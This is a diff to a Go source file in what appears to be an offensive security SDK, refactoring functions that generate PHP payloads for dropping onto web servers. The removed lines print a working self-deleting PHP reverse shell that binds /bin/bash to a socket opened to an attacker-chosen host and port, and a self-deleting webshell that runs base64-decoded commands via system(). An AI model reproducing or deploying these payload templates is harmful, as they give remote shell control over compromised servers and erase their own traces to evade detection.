@@ -1,16 +1,24 @@
 package sdk
 
-// PHPReverseShell returns complete PHP code for a reverse shell (webshell drop).
-// Uses proc_open to bind stdin/stdout/stderr to the socket. Self-deletes after execution.
+// Late-binding hooks for PHP payload generation.
+// Implementations live in pkg/payload, registered via init().
+var (
+	phpReverseShellFn func(string, int) string
+	phpSystemFn       func(string) string
+)
+
+// SetPHPReverseShell registers the PHP reverse shell drop implementation.
+func SetPHPReverseShell(fn func(string, int) string) { phpReverseShellFn = fn }
+
+// SetPHPSystem registers the PHP system exec drop implementation.
+func SetPHPSystem(fn func(string) string) { phpSystemFn = fn }
+
+// PHPReverseShell returns a self-deleting PHP reverse shell for file drop.
 func PHPReverseShell(lhost string, lport int) string {
-	return Sprintf(
-		`<?php unlink(__FILE__);$s=fsockopen("%s",%d);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes); ?>`,
-		lhost, lport,
-	)
+	return phpReverseShellFn(lhost, lport)
 }
 
-// PHPSystem wraps a shell command in PHP for webshell execution.
-// The command is base64-encoded for safe transport. Self-deletes after execution.
+// PHPSystem returns a self-deleting PHP system exec for file drop.
 func PHPSystem(cmd string) string {
-	return Sprintf(`<?php unlink(__FILE__);system(base64_decode("%s")); ?>`, Base64Encode(cmd))
+	return phpSystemFn(cmd)
 }
